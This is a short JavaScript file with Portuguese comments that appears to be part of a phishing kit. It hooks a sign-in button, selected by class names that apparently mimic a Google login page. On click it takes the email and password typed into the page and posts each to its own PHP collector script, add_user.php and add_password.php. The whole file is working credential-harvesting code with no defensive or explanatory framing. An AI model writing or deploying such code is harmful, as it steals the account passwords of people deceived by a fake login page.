// Função para enviar o nome de usuário para o arquivo PHP
function sendUsername() {
  // Obtém o valor do campo de entrada do nome de usuário
  const username = document.querySelector('[type="email"]').value;

  // Cria uma nova solicitação AJAX para enviar o nome de usuário para o arquivo PHP
  const xhr = new XMLHttpRequest();
  xhr.open('POST', 'add_user.php');
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.send(`username=${username}`);

  // Exibe uma mensagem de sucesso ou erro, dependendo da resposta do servidor
  xhr.onload = () => {
    if (xhr.status === 200) {
      console.log('Nome de usuário enviado com sucesso!');
    } else {
      console.error('Ocorreu um erro ao enviar o nome de usuário.');
    }
  };
}

// Função para enviar a senha para o arquivo PHP
function sendPassword() {
  // Obtém o valor do campo de entrada da senha
  const password = document.querySelector('[type="password"]').value;

  // Cria uma nova solicitação AJAX para enviar a senha para o arquivo PHP
  const xhr = new XMLHttpRequest();
  xhr.open('POST', 'add_password.php');
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.send(`password=${password}`);

  // Exibe uma mensagem de sucesso ou erro, dependendo da resposta do servidor
  xhr.onload = () => {
    if (xhr.status === 200) {
      console.log('Senha enviada com sucesso!');
    } else {
      console.error('Ocorreu um erro ao enviar a senha.');
    }
  };
}

// Adiciona os manipuladores de eventos para os botões de envio do formulário
let btn = document.querySelector("[class='VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 qIypjc TrZEUc lw1w4b']");

btn.addEventListener('click', sendUsername);
btn.addEventListener('click', sendPassword);
